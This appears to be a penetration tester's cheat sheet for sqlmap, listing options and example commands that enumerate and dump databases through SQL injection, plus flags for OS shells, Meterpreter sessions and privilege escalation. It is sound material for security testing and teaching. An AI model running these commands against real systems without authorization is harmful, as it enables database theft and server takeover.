# SQLMAP

SQLMap is an open-source penetration testing tool used to automate the process of detecting and exploiting SQL Injection vulnerabilities and taking over database servers.

---

# Installation & Initial Usage

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git

cd sqlmap

python3 sqlmap.py -u "http://10.201.29.17/" --forms --dump -a
```

---

# Basic Commands

| Option | Description |
|--------|-------------|
| `-u URL, --url=URL` | Target URL (e.g. `"http://www.site.com/vuln.php?id=1"`) |
| `--data=DATA` | Data string to be sent through POST (e.g. `"id=1"`) |
| `--random-agent` | Use randomly selected HTTP User-Agent header value |
| `-p TESTPARAMETER` | Specify testable parameter(s) |
| `--level=LEVEL` | Level of tests to perform `(1-5, default 1)` |
| `--risk=RISK` | Risk of tests to perform `(1-3, default 1)` |

---

# Enumeration Commands

These options are used to enumerate database information, structure, and stored data.

| Option | Description |
|--------|-------------|
| `-a, --all` | Retrieve everything |
| `-b, --banner` | Retrieve DBMS banner |
| `--current-user` | Retrieve current DBMS user |
| `--current-db` | Retrieve current database |
| `--passwords` | Enumerate DBMS password hashes |
| `--dbs` | Enumerate databases |
| `--tables` | Enumerate database tables |
| `--columns` | Enumerate table columns |
| `--schema` | Enumerate DBMS schema |
| `--dump` | Dump database table entries |
| `--dump-all` | Dump all databases and tables |
| `--is-dba` | Detect if current user is DBA |
| `-D <DB_NAME>` | Specify database name |
| `-T <TABLE_NAME>` | Specify table name |
| `-C <COLUMN_NAME>` | Specify column name |

---

# Operating System Access Commands

These options can be used to interact with the target operating system through the database server.

| Option | Description |
|--------|-------------|
| `--os-shell` | Get interactive OS shell |
| `--os-pwn` | Get OOB shell / Meterpreter / VNC |
| `--os-cmd=OSCMD` | Execute operating system command |
| `--priv-esc` | Attempt privilege escalation |
| `--os-smbrelay` | One-click OOB shell / Meterpreter / VNC |

---

# Simple HTTP GET Based Testing

## Enumerate Databases

```bash
sqlmap -u "https://testsite.com/page.php?id=7" --dbs
```

## Enumerate Tables

```bash
sqlmap -u "https://testsite.com/page.php?id=7" -D blood --tables
```

## Enumerate Columns

```bash
sqlmap -u "https://testsite.com/page.php?id=7" -D blood -T blood_db --columns
```

## Dump Complete Database

```bash
sqlmap -u "https://testsite.com/page.php?id=7" -D blood --dump-all
```

---

# Simple HTTP POST Based Testing

First copy the complete HTTP request from Burp Suite into a file such as `req.txt`.

Example vulnerable parameter: `blood_group`

## Enumerate Databases

```bash
sqlmap -r req.txt -p blood_group --dbs
```

## Enumerate Tables

```bash
sqlmap -r req.txt -p blood_group -D blood --tables
```

## Enumerate Columns

```bash
sqlmap -r req.txt -D blood -T blood_db --columns
```

## Dump Complete Database

```bash
sqlmap -r req.txt -D blood --dump-all
```

---

# Quick Summary

- Automated SQL Injection Testing
- Database Enumeration
- Data Dumping
- Authentication Bypass Testing
- OS Command Execution
- Privilege Escalation
- GET & POST Request Testing
- Burp Suite Request Integration
